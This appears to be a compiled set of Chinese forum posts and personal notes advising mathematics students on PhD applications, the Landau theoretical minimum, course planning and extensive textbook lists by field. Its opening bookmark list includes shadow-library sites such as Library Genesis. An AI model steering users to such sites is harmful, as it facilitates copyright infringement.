* books
http://gen.lib.rus.ec/
https://www.jiumodiary.com/
http://www.bartleby.com/
https://www.gutenberg.org/
http://digital.library.upenn.edu/
http://booksc.org/
http://vdisk.weibo.com/
http://ishare.iask.sina.com.cn/
https://bookfere.com/
http://www.xilinjie.com/
https://shuge.org/
* mathematics
数学ftp://210.45.114.81

从科研和人才培养上讲，我认为以下学校的数学学科应该算是世界顶尖水平：

　　美国：Princeton、NYU、UChicago、Berkeley、Havard、MIT、Caltech、Brown。

　　德国：玻恩大学。

　　俄罗斯：莫斯科大学、圣彼得堡大学。

　　日本：东京大学、京都大学。

　　以色列：希伯莱大学。

　　英国：剑桥大学。

　　法国：ENS de Ulm、巴黎第六大学、南巴黎大学。

　　瑞士：ETH Zurich。

　　匈牙利：Eotvos Lorand大学。

　　不过从申请上说，因为各种原因，有些学校水平虽然高，但是很少或者基本不提供
奖学金，比如说俄罗斯的莫斯科大学、圣彼得堡大学、匈牙利的Eotvos Lorand大学，还
有像法国巴黎第六大学、南巴黎大学、德国的玻恩大学，一般只对博士生提供奖学金，
硕士生就很难拿到奖学金，所以一般去那里都是读博士的。有些学校也提供奖学金，但
是毕业以后很难留下来找到合适的教职，要到其它国家找教职，所以申请难度也不是非
常高，比如说东京大学、京都大学、ETH Zurich。还有些学校，所在国家的语言国内找
不到地方教，所以没人会去，比如说以色列的希伯莱大学，教学是用希伯莱语，国内估
计只有北京上海能找到教希伯莱语的地方。所以实际上，申请难度最大的也就是这么几
个：

　　美国的Princeton、NYU、UChicago、Berkeley、Havard、MIT、Caltech、Brown，法
国的ENS de Ulm（巴黎高师），主要是美国的这几个学校，其中纯数学方面Princeton、
UChicago，应用数学方面NYU申请难度最大。法国的ENS de Ulm申请难度应该说和这三个
学校类似，但是因为申请的方式不同，侧重点不同，也不太好具体比较。

　　对于任何专业的申请，GPA、论文、推荐信、GT成绩都是比较关键的因素。不过相对
来说，GT一般就是达到一定标准即可。至于GPA，一般地说，敢申请Princeton、UChica
go、NYU，包括ENS de Ulm的GPA肯定都不会低，负责招生的教授要单看GPA也很难取舍。
在这种情况下，论文和推荐信这些东西就很关键了。特别对于数学专业，一般本科生很
难在申请的时候有发表的论文，如果谁有，自然就大占便宜了。至于推荐信，这个也是
显然的，如果你拿着Wolf数学奖得主级大牛的推荐信去申请，那当然是无往不胜了。

　　不过论文也罢，推荐信也罢，关键的是专业实力。大家要明白，人家给你奖学金，
让你去读研究生，那是指望你的专业水平，能帮教授出论文，能给本科生做好助教。至
于各种申请技巧，比如说找教授套瓷，基本的还是要靠你的专业实力，否则你都不知道
怎么和教授搭上话。就算搭上话了，人家几封信就看出你是草包，当然也不会要你了。
所以归根到底，要想拿到数学类的牛OFFER，一定要有专业实力。提高专业实力，这个是
个长期的过程，如果你等到大三快申请的时候才开始注意这点，基本上，我可以说，你
已经来不及了。所以一定要从现在就开始，抓紧时间提高实力。

　　提高专业实力的基本要点就两条：

　　1，要打好基础。

　　2，要尽早开始接触本学科的前沿，参加科研工作，早点写出有水平的论文。

　　特别是要指出的是，有些人总觉得，要把基础打得非常扎实，相关专业课都学完了
，才能开始参加讨论班、读论文、跟导师做研究。不过，这其实是个错误的指导思想。
打基础当然很重要，但是如果你非要等基础打的非常扎实、相关专业课都学完了，才去
读论文、参加讨论班，那么你恐怕本科毕业都不能开始做论文。课是上不完的，基础也
是打不完的。正确的做法是，基础打的差不多了，就开始参加一些讨论班，读专业论文
，然后边做研究，边打基础，边干边学。

　　对于数学类专业，特别是数学与应用数学专业，最重要的基础就是：数学分析、解
析几何、线性代数、抽象代数、古典微分几何、微分流形、实变函数、泛函分析、常微
分方程、偏微分方程、概率论。信息与计算科学专业还要加上数值分析。此外，四大力
学（理论力学、电动力学、量子力学、热力学与统计物理学）和连续介质力学对于数学
与应用数学专业和信息与计算科学专业（即计算数学）也是非常重要的。至于统计学专
业，因为我不太熟悉，就不提了。这些课程是相关方向的专门化课程的必要的基础，是
必须要学扎实的。但是正如前面说的，基础是打不完的，所以也不能完全等到把这些课
都学到滚瓜烂熟的时候才去学习专门化课和参加科研工作。

　　实事求是的说，科大的数学offer，虽然比除北大以外的其它学校都要好，但是和北
大还是有一些差距的。统计学和应用数学以及计算数学和北大比是半斤八两，可能还要
好一些，但是纯数学的offer确实存在差距，北大基本上每年都有Princeton或者UChica
go的纯数学offer，科大就没有，至于ENS de Ulm，因为科大过去的申请重点不在法国，
所以不好比较。至于原因，很简单，北大数学学院的本科生源比科大数学系要好一些，
北大新生中有奥赛金牌，这对申请是很有帮助的，此外有些竞赛保送生，高中的时候就
学过一些大学的课程，所以可以早些开始做论文。不过这点差距，还是完全可能通过努
力弥补的。对于想拿到 Princeton、UChicago的纯数学offer的学生，包括想去ENS de
Ulm的学生，我有四点建议：

　　1，对于数学类的基础课，应该在上课以前适当超前学习，最好能在大二以前就把基
础课自学一遍，这样学两遍，一可以保证比较高的GPA，二可以保证尽早开始做论文。

　　2，大三开始在系里找导师，参加科研，尽早完成论文。

　　3，对于参考书，看是一定要看的，但是最好就在课本之外选一本经典的国外教材，
把上面的题目做一遍就可以了。

　　4，GRE应该在大二结束以前通过，越早越好，这样做的原因是：首先，早点通过GR
E可以避免到后来又要上课又要读文献又要做研究，搞得手忙脚乱；其次早点过GRE，对
于提高阅读英文资料的速度是有好处的。还有就是，一般大家考GRE都是在暑假准备，但
是暑假恰恰是学术会议最多的时候。无论国内外都是如此，我觉得对于想拿顶级offer的
学生应该多争取机会参加这种会议，一方面固然是可以可以开拓眼界，另外一方面则是
在这些会议上，有可能能够和一些大牛建立学术上的联系，将来可以争取让他们写推荐
信，这对于申请来说非常重要。

　　对于四大力学，这里要说一下，如果是想往数学物理方向（不论是量子场论、弦论
、量子可积系统还是其它的方向）发展的，当然是越早学完越好，而且要学扎实，要看
参考书，而且要有全面的物理基础，要能达到Landau Minimum Exam的要求（不过这个也
可以等到出国读研究生的时候。），而且一定要上实验课，理论物理专业要上那些物理
实验课，想学数学物理的学生也要上。但是对于其它的学生，晚一些学也无妨，甚至可
以等到出国读研究生的时候再学，物理基础和实验也不需要有那么高的要求。

　　前面说到套瓷的问题，这里我再重点说一下。我发现很多人套瓷一点技术含量都没
有。我经常看见有人用类似这样的办法套瓷：“尊敬的XXX教授，我是 XXX大学的XXX，
我对你的研究方向很感兴趣，很想跟你读研究生，我的GPA是XXX，有论文XXX......”。
这样的套瓷，我可以说，除非那教授根本招不到人，否则一定会把这种东西当垃圾邮件
删除。这种用垃圾邮件制造商的办法去套瓷的办法，是最低级的办法，成功率基本为零
。我觉得，如果想套瓷，那必须要从学术上入手。比如说你想跟某个教授读研究生，那
么首先，动手要早，不要等到大四要申请的时候再去套，那么企图太明显，你起码等提
前大半年开始动手。其次，你要先研究这个教授的论文，看看能不能提出什么比较好的
问题或者做出什么改进之类，然后你给这个教授发信，说你对他的论文有些看法，想要
交流之类，先搭上话，然后慢慢拉关系，最后看到时间差不多，就可以提跟他读研究生
的问题。当然了，除此之外，还需要做一些其它的情报工作，比如说你得知道他有没有
钱招人，在系里的招生委员会里说不说得上话之类。这样套瓷，虽然不可能同时套很多
人，但是成功率绝对比前面一种套瓷有效。但是有个前提就是，你一定要有足够的学术
实力还可以这么做，否则你没有办法这样套瓷。



Landau Minimum Exam的具体要求：

1. 数学 1

考试内容：微分方程、数学物理方程、张量分析与微分几何


2. 力学

考试内容：Landau-Lifshits I, 除以下小节：27, 29, 30, 37, 51 (1988)

          V.I.Arnold，Mathematical methods of classical mechanics


3. 经典场论

考试内容：Landau and Lifshits II, 除以下小节：50, 54-57, 59-61, 68, 70, 74,

77, 97, 98, 102, 106, 108, 109, 115-119 (1989)


4.数学 2

考试内容：复变函数，特殊函数（Bessel，椭圆，gamma，正交多项式），积分变换


5.量子力学

考试内容：Landau-Lifshits III (1989) 除以下小节：29, 49, 51, 57, 77, 80, 84,


85, 87, 88, 90, 101, 104, 105, 106-110, 114, 138, 152


6.量子电动力学

考试内容：Landau-Lifshits IV (1980) 除以下小节：9, 14-16, 31, 35, 38-41, 46-


48, 51-52, 55, 57, 66-70, 82, 84-85, 87, 89-91, 95-97, 100-101, 106-109,

112, 115-144


7.统计物理学 I

考试内容：Landau-Lifshits V 除以下小节：22, 30, 50, 60, 68, 70, 72, 79, 80,

84, 95, 99, 100, 125-127, 134-141, 150-153, 155-160


8.连续介质力学

考试内容：流体力学，Landau-Lifshits VI (1986) 除以下小节：1, 13, 14, 21, 23,


25-27, 28, 30-32, 34-48, 53-59, 63, 67-78, 80, 83, 86-88, 90, 91, 94-141

弹性理论，Landau-Lifshits VII (1987) 除以下小节：8, 9, 11-21, 25, 27-30, 32-


47


9.连续介质电动力学

考试内容：Landau-Lifshits VIII (1982) 除以下小节：1-5, 9, 15, 16, 18, 25,

28, 34-35, 42-44, 56-57, 61-64, 69, 74, 79-81, 84, 91-112, 123, 126


10.统计物理学 II

考试内容：Landau-Lifshits IX (1978)，考以下小节：1-5, 7-18, 22-27, 29, 36-

40, 43-48, 50, 55-61, 63-65, 69


11.物理动理学

考试内容：Landau-Lifshits X (1979)，考以下小节：1-8, 11, 12, 14, 21, 22, 24,


27-30, 32-34, 41-44, 66-69, 75, 78-82, 86, 101.

这里写的Landau-Lifshits XX，比如说Landau-Lifshits VIII是指Landau和Lifshits的
理论物理教程第八卷。




本着求精不求多的原则，我给一个参考书目，至于其它的参考书，可以将来再慢慢看。
说实在的，其实做研究的过程也是一个打基础的过程，有时候自己什么地方基础不扎实
，也只有开始搞研究的时候才可以发现，考试100分的不一定基础就比90分的好，能做出
东西来那才是真格的。




第一学期，数学分析，高等代数，解析几何，数论,计算机C语言
第二学期.数学分析，线性代数，离散数学，计算机C语言，视觉几何和拓扑
第三学期，抽象代数，数学分析，点集拓扑，数理逻辑入门，计算机C++，常微分方程
第四学期，数学分析，电脑几何实践（wolfram mathematics 绘图）），常微分方程，概率论，经典微分几何，实分析。计算机C++
第五学期，偏微分方程，复变函数，数理统计，微分几何和拓扑（流形了），泛函分析，计算机实践（解非线性微分方程）。两门专业课。选修。很明显我选择了自己导师的。
第六学期，偏微分方程，复变函数（多变量到代数曲线），随机过程，泛函分析。计算机实践（边界问题算法），选修两门。加年级论文
第七学期，历史，数值分析，离散，数论，经典力学，计算机实践。变分法和最优化方程。两门选修。一门自然科学课（选的自动化与机器人理论）
第八学期，历史，数值分析，数学与历史和方法。解析力学，计算机实践两门选修。一门自然科学课（准备选的量子力学的几何结构）。第九学期，哲学，经济，力学。honors courses 要求选择两门以上。论文。
第十学期，哲学，力学。honors courses 要求选择两门以上。论文。
1、老老实实把课本上的题目做完。其实说科大的课本难,我以为这话不完整。科大的教材,就数学系而言还是讲得挺清楚的,难的是后面的习题。事实上做1道难题的收获是做10道简单题所不能比的。
2、每门数学必修课至少要看一本参考书,尽量做一本习题集。
3、数学分析别做吉米，除非你太无聊,推荐北大方企勤的习题集。此外注意一下有套波兰的数学分析习题集，是不是搞得到中文或英文版。
4、线性代数推荐普罗斯库列科夫的<<线性代数习题集>>和法捷耶夫的<<高等代数习题集>>。莫斯科大学要求把上面的题全做光。建议大家在搞定亚洲第一难书的同时也把里面的题打通。
5、解析几何不要不重视。现在有种削弱几何课的倾向,甚至有的学校把解析几何课改成只有两课时,这样一来,几何训练不足,会很吃亏的。
6、常微要看看阿诺尔德的书,打通菲利波夫的习题集。
7、数论课是很重要的,起码可以锻炼思维能力。
8、数学分析、线性代数、解析几何、泛函、拓扑、抽象代数、实变、微分几何是最重要的课,大家脱层皮也要学好。要尽量加强这方面的工底,不然的话以后很吃亏。
9、有时间去物理系多听课,千万不要毕业了连量子力学也不懂,这样的数学家注定要被淘汰的。读读费曼物理讲义和郎道的理论物理教程。
10、华罗庚的<<数论导引>>的前言大家好好看看,多多领会!
11、想读数理统计和计算数学的要注意,统计和计算数学同样是数学类的专业,不要以为加上计算和统计就可以降低要求。

数学分析——>常微分方程——>①实变函数——>②泛函分析——>函数论——>算子理论——>③偏微分方程——>傅里叶分析与小波分析——>积分变换——>数学物理方程
④高等代数——>⑤近世代数——>矩阵论——>运筹学&图论——>优化理论——>组合优化&凸优化——>数值分析与计算+③——> 偏微分方程数值解+②——>线性系统与复杂系统理论——>信息论+①②⑥——>模式识别+③——>统计学习or机器学习（含深度学习）
初等数论+⑤——>密码学原理+②（存疑，这块不太熟悉）——>椭圆函数论——>解析函数论
解析几何——>高等几何+③——>拓扑学——>微分几何+⑤——>流型论
⑥概率论与数理统计——>回归分析+④——>多元统计——>时间序列分析——>面板数据分析——>非参数统计——>贝叶斯统计——>抽样论——>实验设计——>生存分析与可靠性
测度论+①⑥——>高等概率论——>随机过程（含鞅）——>高等数理统计+③——>⑦随机微分方程
利息理论+⑥——>寿险精算——>非寿险精算——>金融工程+⑦——>金融衍生品



数学分析：

V.A.Zorich，数学分析，高等教育出版社。

G.M.Fikhtengolts，微积分学教程，高等教育出版社（只用看例题和数项级数那章就可
以了）。



 Mathematical Analysis：
 Principles of Mathematical Analysis, 3rd ed.	Rudin

线性代数与抽象代数：

E.B.Vinberg，A Course in Algebra，AMS。（建议优先选这本，不过这本书可能国内很
不容易找到，如果搞不到，那就看下面这本。）

A.I.Kostrikin，代数学引论，高等教育出版社。

解析几何：

V.V.Prasolov and V.M.Tikhomirov，Geometry，AMS。

常微分方程：

V.I.Arnold，Ordinary Differential Equation，Springer。

实变函数：

D.W.Stroock，A Concise Introduction to the Theory of Integration，Birkhauser
。


Real and Complex Analysis，Rudin


复变函数：

Kunihiko Kodaira（小平邦彦），Complex Analysis，Cambridge。


Complex Analysis：
Complex Analysis, 3rd ed，Ahlfors, Lars V


古典微分几何与微分流形：

B.A.Dubrovin、A.T.Fomenko、S.P.Novikov，Modern Geometry，Springer。

数论：

Kenneth Ireland，A Classical Introduction to Modern Number Theory，Springer。


泛函分析：

Peter D.Lax，Functional Analysis，Wiley-Interscience。

M.Reed、B.Simon，Methods of Modern Mathematical Physics, Vol. 1: Functional
Analysis，Academic Press。（看里面的无界算子那章就可以了。）




偏微分方程：

V.S.Vladimirov，Equations of Mathematical Physics，MIR。

V.S.Vladimirov，A Collection of Problems on Equations of Mathematical Physic
s，Springer。（这本书是前一本书的配套习题集，不过里面题目很多，要全做完不太可
能，选三分之一的题目应该就差不多了。）

概率论：

A.N.Shiryaev，Probability，Springer。（这书最好分成两部分看，第一部分是，第一
章的1-6节，第二章的1-8节、10 节、12-13节，第三章的1-8节、11节，第四章的1-4节
，第二部分是书里的其它部分。我以前用这本书教学的时候，第一部分是本科生必修课
“概率论”的内容，第二部分是多数方向的选修课和概率论方向的必修课“概率论的附
加章节”这门课的内容。）

随机过程：

A.V.Bulinsky、A.N.Shiryaev，随机过程论，高等教育出版社。

数理统计：

P.J.Bickel、K.A.Doksum，Mathematical Statistics Vol I，Prentice-Hall。

拓扑学：

V.A.Vassiliev，A.Sossinski，Introduction to Topology，AMS。（这本书的除了第一
章，其它各章的内容实际上在Novikov的Modern Geometry里也讲了，第一章在Zorich的
数学分析也讲了，不过这些重复的部分都是很重要的东西，好在书很薄，多看也不花费
多少时间。）

数值分析：

M.T.Heath，Scientific Computing: An Introductory Survey，McGraw-Hill。（数学
系现在用的数值分析教材应该是Kincaid的Numerical Analysis，这两本书正好互补。H
eath的这本书比较侧重于各种算法的上机实现。）

N.S.Bakhvalov，Numrical Method，MIR。

普通物理：

L.D.Landau、A.I.Akhiezer、E.M.Lifshitz，General Physics：Mechanics and Molec
ular Physics，Pergamon。

E.M.Purcell，Electricity and Magnetism，Mcgraw-Hill。

A.N.Matveev，Optics，Mir。

P.Feynman，The Feynman Lectures on Physics，Addison-Wesley。（重点推荐第三卷
，能在普通物理的层次上把量子力学的基本概念讲明白的，据我所知，也就是这本书了
，包括 Nobel奖得主Ginzburg编写的俄文版的普通物理教科书，这方面也有些问题。）


以上是数学类的主要课程。


下面是对于学纯数学的来说非常重要的课程：

代数拓扑学：

B.A.Dubrovin、A.T.Fomenko、S.P.Novikov，Modern Geometry，Springer。

R.Bott、L.W.Tu，Differential Forms in Algebraic Topology，Springer。

代数几何：

I.R.Shafarevich，Basic Algebraic Geometry Vol II，Springer。

表示论：

W.Fulton、J.Harris，Representation theory：A first course，Springer。

交换代数：

M.F.Atiyah、I.G.Macdonald，Introduction to Commutative Algebra，Addison-Wesl
ey。

微分拓扑学：

J.Milnor，Differential Topology。（作者在Princeton的油印讲义，没有正式出版，
中文翻译可以收在下面一本书的中文版里，翻译质量还不错。）

J.Milnor，Topology from the Differentiable Viewpoint，Princeton University P
ress。

J.Milnor，Morse Theory，Princeton University Press。

测度论：

Vladimir Bogachev，Measure Theory，Springer。（这本书的第一卷其实也是很不错的
实变函数教科书，第二卷则是包括很多新的研究成果的测度论教材，我相信这本书将在
很长一段时间成为测度论的标准教材。）

Fourier分析：

L.Hormander，The Analysis of Linear Partial Differential Operators I：Distri
bution Theory and Fourier Analysis，Springer。（Fourier分析是很重要的一门课，
不过很遗憾的是，中国学生在这方面学得很少，这是一个明显的缺陷。）

Fourier Analysis ：

Fourier Analysis: An Introduction，Stein, Elias M.



以下是理论物理方面的课程：

理论力学：

L.D.Landau、E.M.Lifshitz，Course of Theoretical Physics Volume 1：Mechanics，
Pergamon Press。

V.I.Arnold，Mathematical Methods of Classical Mechanics，Springer。

连续介质力学：

L.D.Landau、E.M.Lifshitz，Course of Theoretical Physics Volume 6：Fluid Mech
anics，Pergamon Press。

L.D.Landau、E.M.Lifshitz，Course of Theoretical Physics Volume 7：Theory of
Elasticity，Pergamon Press。

电动力学：

L.D.Landau、E.M.Lifshitz，Course of Theoretical Physics Volume 2：The Classi
cal Theory of Fields，Pergamon Press。

L.D.Landau、E.M.Lifshitz、L.P.Pitaevskii，Course of Theoretical Physics Volu
me 8：Electrodynamics of Continuous Media，Pergamon Press。

量子力学：

D.J.Griffiths，Introduction to Quantum Mechanics，Addison-Wesley。

高等量子力学：

L.E.Ballentine，Quantum Mechanics：A Modern Development，Prentice Hall。

统计物理学：

L.D.Landau、E.M.Lifshitz，Course of Theoretical Physics Volume 5：Statistica
l Physics Part I，Pergamon Press。

高等统计物理学：

M.Le Bellac、F.Mortessagne、G.Batrouni，Equilibrium and Non-Equilibrium Stat
istical Thermodynamics，Cambridge University Press。

E.M.Lifshitz、L.P.Pitaevskii，Course of Theoretical Physics Volume 9：Statis
tical Physics Part II，Pergamon Press。

E.M.Lifshitz、L.P.Pitaevskii，Course of Theoretical Physics Volume 10：Physi
cal Kinetics，Pergamon Press。

量子场论：

M.E.Peskin、D.V.Schroeder，An Introduction to Quantum Field Theory，Perseus。


广义相对论：

H.C.Ohanian、R.Ruffini，Gravitation and Spacetime，W.W.Norton & Company。

关于这个参考书目和下面的参考书目特别说明一下，我想对于纯数学专业，把这个参考
书目上的数学书看完，就算是打下一个足够的数学基础了。下一步就是按自己的研究方
向，按照需要什么学什么的原则，在导师指导下或者自己选一些相关的参考书看。

随便讲一下，我过去见过一些数学专业的学生，基本上都是本科生，野心很大，什么都
想搞，什么都想学，于是漫无目的的去看书读文献，精神可嘉，效果却没有一个好的。
我认为，即便是有人想成为Von Nuemann、Kolmogorov那样的所谓“全能型”数学家，也
不能这么看。首先现在不是Newton、Gauss的时代，也不是Poincare 的时代，自二十世
纪以来，数学知识成爆炸性增长，没有任何人可以面面俱到，二十世纪以前有可能有人
能够面面俱到，但是以后根本不可能，即便是Von Nuemann、Kolmogorov这样的号称“全
能”的数学家，其实也不是面面俱到的，Von Nuemann在数论和拓扑学上没有什么贡献，
Kolmogorov不搞数论，微分几何他也不研究。而且这二位的研究也有个主线，比如 Kol
mogorov，早年从Luzi的实变函数讨论班上学来了很多实变函数相关的东西，然后去Got
tingen访问的时候又从Emmy Noether那里学了点东西，他后来搞概率论、动力系统、泛
函分析、拓扑代数、拓扑学、流体力学、理论计算机科学、数理统计，其实通通都是在
这个基础上演化出来的。Von Nuemann的情况也差不多。

我觉得，正确的做法还是要先在一个方向上搞扎实，做出成果来，然后再争取往其它方
向扩展。看书读文献也一样，一定要有一个主线，其它东西只能是个补充，绝对不能喧
宾夺主。


【 在 garnetcrow (外交部首席发言人及两报一刊特?) 的大作中提到: 】
: 义务劳动
: Landau Minimum Exam的具体要求：
: 1. 数学 1
: 考试内容：微分方程、数学物理方程、张量分析与微分几何
: 2. 力学
: 考试内容：Landau-Lifshits I, 除以下小节：27, 29, 30, 37, 51 (1988)
:           V.I.Arnold，Mathematical methods of classical mechanics
: 3. 经典场论
: 考试内容：Landau and Lifshits II, 除以下小节：50, 54-57, 59-61, 68, 70, 74,
: 77, 97, 98, 102, 106, 108, 109, 115-119 (1989)
: .................（以下省略）


euro


Algebra

分析，几何很多。但代数太少。

代数方法是现代数学的核心。可惜中国人会的太少。

科大人不能陶醉在拿名校offer 光荣历史里。

北大这些年的学生代数功力比科大的学生强。因为有人告诉他们要读

Grothendieck's EGA. 科大的学生要自己组织讨论班。

要去找科大新来的老师：欧阳毅。让他帮助你们。

科大很多年没人学　arithmetic geometry, number theory, algebraic geometry,

没有这些代数功力，你几何都玩不转。The modern geometry is becoming more

and more algebraic. Even in Yau's seminar, you can hear Grothendieck, stack,


2-stack. Without algebra, you can hardly do mathematical physics either.


义务劳动



回复 #6 euro 的帖子

EGA全部看完，那很困难，特别是这本书只有法文版，没有英文版，老实说我也没有看完
。而且也并不是所有学代数几何和代数数论的都看过EGA。而且对于代数和数论来说，代
数几何是很重要，但是表示论的重要性也不在代数几何之下。我想学代数几何的话，还
是从Shafarevich的Basic Algebraic Geometry开始，然后看Harshorne的Algebraic Ge
ometry，然后根据个人研究方向，再学习诸如椭圆曲线、模形式、自守形式、复流形、
几何不变量理论，Abel簇之类的专门化课程。

不过这里提一下外语的问题，学数学光会英语还是不够用的，我想法语和俄语也是应该
会，至少应该有拿词典阅读专业文献的能力。比较好的办法是在英语过关的情况下，找
给英语为母语的人写的法语或者俄语教材，用英语来学法语或者俄语，因为从语言学上
讲，法语或者俄语和英语的亲缘关系要比和中文近得多。从英语学这两种语言也比用中
文来学更省力一些。
pppppppppppp

chan


学数学或者物理,本来就要看这么多东西,法语俄语还要顺带学着,有戏吗还


义务劳动



其实只是要求看懂文献的话，学好英语再去学法语或者俄语，这还是比较容易的，我可
没有说要把法语和俄语学到和英语一样听说读写都没有问题的程度。而且欧美不少学校
的数学博士都有类似的要求，比如说Princeton的数学博士就要求至少要能够阅读法语、
俄语、德语这三种语言中的两种写的文献。



各方向的一些专业门化课程的参考书，大家可以在自己组织讨论班或者上相关的专门化
课程的时候参考：

量子群、代数群与李理论方向：

J.P.Serre，Lie Algebras and Lie Groups，Springer。

A.L.Onishchik、E.B.Vinberg，Lie Groups and Algebraic Groups，Springer。

V.I.Voskresenskii，Algebraic Groups and Their Birational Invariants，AMS。

V.Kac，Infinite-dimensional Lie Algebras，Birkhauser。

J.Hong、S-J.Kang，Introduction to Quantum groups and Crystal Bases，AMS。

S.Majid，A Quantum Groups Primer，Cambridge University Press。

G.Lusztig，Introduction to Quantum Groups，Birkhauser。

S.Ariki，Representations of Quantum Algebras and Combinatorics of Young Tabl
eaus，AMS。

代数表示论方向：

J.A.Drozd、V.V.Kirichenko，Finite Dimensional Algebras，Springer。

M.Auslander、I.Reiten、S.O.Smalo，Representation theory of Artin Algebras，C
ambridge University Press。

I.Assem、A.Skowronski、D.Simson，Elements of the Representation Theory of As
sociative Algebras，Cambridge University Press。

C.M.Ringel，The Hall Algebra Approach to Quantum Groups（http://www.math.uni
-bielefeld.de/~ringel/elam.ps）。

C.M.Ringel，Tame Algebras and Integral Quadratic Forms，Springer。

W.Crawley-Boevey，Lectures on Representations of Quivers（http://www.amsta.l
eeds.ac.uk/~pmtwc/quivlecs.pdf）。

W.Crawley-Boevey，More Lectures on Representations of Quivers（http://www.am
sta.leeds.ac.uk/~pmtwc/morequivlecs.pdf）。

W.Crawley-Boevey，Geometry of Representations of Algebras（http://www.amsta.
leeds.ac.uk/~pmtwc/geomreps.pdf）。

V.Ginzburg, Geometric Methods in Representation Theory of Hecke Algebras and
 Quantum Groups（http://arxiv.org/abs/math.AG/9802004）。

C.M.Ringel, The Preprojective Algebra of a Quiver（http://www.mathematik.uni
-bielef ... rints/pr97046.ps.gz）。


数论方向：

J-P.Serre，A Course in Arithmetic，Springer。

A.A.Karatsuba，Basic Analytic Number Theory，Springer。

N.I.Koblitz，Introduction to Elliptic Curves and Modular Forms，Springer。

H.Lange、C.Birkenhake，Complex Abelian Varieties，Springer。

M.Hindry、J.Silverman，Diophantine geometry，Springer。

N.I.Koblitz，P-Adic Numbers，P-Adic Analysis and Zeta-Functions，Springer。

L.E.Washington，Introduction to Cyclotomic Fields，Springer。

J-P.Serre，Local Fields，Springer。

K.Iwasawa，Local Class Field Theory，Oxford University Press。

G.Shimura，Introduction to the Arithmetic Theory of Automorphic Functions，P
rinceton University Press。

R.J.Valenza、D.Ramakrishnan，Fourier Analysis on Number Fields，Springer。

J.Milne，Etale Cohomology，Princeton University Press。

R.Langlands，Automorphic Forms on GL(2)，Springer。

D.Bump，Automorphic Forms and Representations，Cambridge University Press。

P.Vojta，Diophantine Approximations and Value Distribution Theory，Springer。


C.Soule、D.Abramovich、J.F.Burnol、J.K.Kramer，Lectures on Arakelov Geometry
，Cambridge University Press。

代数几何方向：

R.Hartshorne，Algebraic geometry，Springer。

I.R.Shafarevich，Basic Algebraic Geometry Vol II，Springer。

D.Mumford、J.Fogarty、F.Kirwan，Geometric Invariant Theory，Springer。

V.I.Danilov、V.V.Shokurov，Algebraic Curve，Algebraic Manifolds and Schemes，
Springer。

D.Huybrechts，M.Lehn，The Geometry of Moduli Spaces of Sheaves，Vieweg。

W.Fulton，Intersection theory，Springer。

A.Beilinson、V.Drinfeld，Chiral Algebra，AMS。

Vladimir Drinfeld，Infinite-dimensional Vector Bundles in Algebraic Geometry
（http://arxiv.org/abs/math.AG/0309155）。

E.Frenkel，Recent Advances in the Langlands Program（http://arxiv.org/abs/ma
th/0303074）。

E.Frenkel，Ramifications of the geometric Langlands Program（http://arxiv.or
g/abs/math.QA/0611294）。

E.Frenkel，Affine Algebras，Langlands Duality and Bethe Ansatz（http://arxiv
.org/abs/q-alg/9506003）。

V.Ginzburg，Geometric Methods in Representation Theory of Hecke Algebras and
 Quantum Groups（http://arxiv.org/abs/math/9802004v3）。

C.Sorger，Lectures on Moduli of Principal G-Bundles Over Algebraic Curves（h
ttp://users.ictp.it/~pub_off/lectures/lns001/Sorger/Sorger.pdf3）。

V.Ginzburg，Perverse sheaves on a Loop group and Langlands's duality（http:/
/arxiv.org/abs/alg-geom/9511007）。

I.Mirkovic、K.Vilonen，Geometric Langlands Duality and Representations of Al
gebraic Groups over Commutative Rings（http://arxiv.org/abs/math.RT/0401222）
。

复分析与复几何方向：

B.V.Shabat，Introduction to Complex Analysis Part II，AMS。

D.Huybrechts，Complex Geometry，Springer。

P.Griffiths、J.Harris，Principles of algebraic geometry，Wiley。

C.Voisin、L.Schneps，Hodge Theory and Complex Algebraic Geometry，Cambridge
University Press。

D.Olivier，Higher Dimensional Algebraic Geometry，Springer。

W.Ballmann，Lectures on Kahler Manifolds，AMS。

W.Barth、C.Peters、A.Ven，Compect Complex Surfaces，Springer。

R.O'Neil，Differential Analysis on Complex Manifolds，Springer。

L.V.Ahlfors，Conformal Invariants，McGraw-Hill。

R.C.Gunning，Lectures on Riemann Surfaces，Princeton。

L.V.Ahlfors，Lectures on Quasiconformal Mappings，Nostrand Company。

A.A.Maks、V.G.Vladislav，Conformal Differential Geometry and Its Generalizat
ions，Wiley-Interscience。

H.Grauert、R.Remmert，Theory of Stein Space，Springer。

D.Joyce，Compact Manifolds with Special Holonomy，Oxford University Press。

R.K.Lazarsfeld，Positivity in Algebraic Geometry，Springer。

J-M.Hwang，Geometry of Minimial Rational Curves on Fano Manifolds（http://us
ers.ictp.it/%7Epub_off/lectures/lns006/Hwang/Hwang.pdf）。

J-M.Hwang，Base Manifolds for Fibrations of Projective Irreducible Symplecti
c Manifolds（http://arxiv.org/abs/0711.3224）。

抽象调和分析方向：

Y.Katznelson，An introduction to harmonic analysis，Cambridge University Pre
ss。

E.M.Stein，Analytic Continuation of Group Representations，Princeton Univers
ity Press。

W.Rudin，Fourier Analysis on Groups，Wiley。

G.Warner，Harmonic Analysis on Semi-Simple Lie Groups，Springer。

W.Rudin，Function Theory in the Unit Ball of Cn，Springer。

S.Helgason，Differential Geometry, Lie Groups, and Symmetric Spaces，AMS。

S.Helgason，Geometric Analysis on Symmetric Spaces，AMS。

G.Warner，Harmonic Analysis on Semi-Simple Lie Groups，Springer。

经典调和分析与逼近论方向：

E.M.Stein、G.Weiss，Introduction to Fourier Analysis on Euclidean Spaces，Pr
inceton University Press。

E.M.Stein，Singular Integrals and Differentiability Properties of Functions，
Princeton University Press。

E.M.Stein，Harmonic Analysis: Real-Variable Methods, Orthogonality and Oscil
latory Integrals，Princeton University Press。

I.Daubechies，Ten Lectures on Wavelets，SIAM。

E.W.Cheney、W.A.Light，A Course in Approximation Theory，Brooks Cole。

B.Sendov，Hausdorff Approximations，Sofia。

L.L.Schumaker，Spline Functions，Wilty。

G.Szego，Orthogonal Polynomials，AMS。

V.I.Smirnov、N.A.Lebedev，Functions of Complex Variable：Constructive Theory
，MIT。

T.W.Gamelin，Uniform Algebras，Prentice-Hall。

A.F.Nikiforov、V.B.Uvarov，Special Functions of Mathematical Physics，Birkha
user。

A.M.Olevsky，Fourier Series with Respect to General Orthogonal Systems，Spri
nger。

算子代数与非对易几何方向：

R.V.Kadison、J.R.Ringrose，Fundamentals of the Theory of Operator Algebras，
AMS。

N.Dunford、J.T.Schwartz，Linear Operators，John-Wiley。

M.A.Naimark，Normed Rings，Groningen。

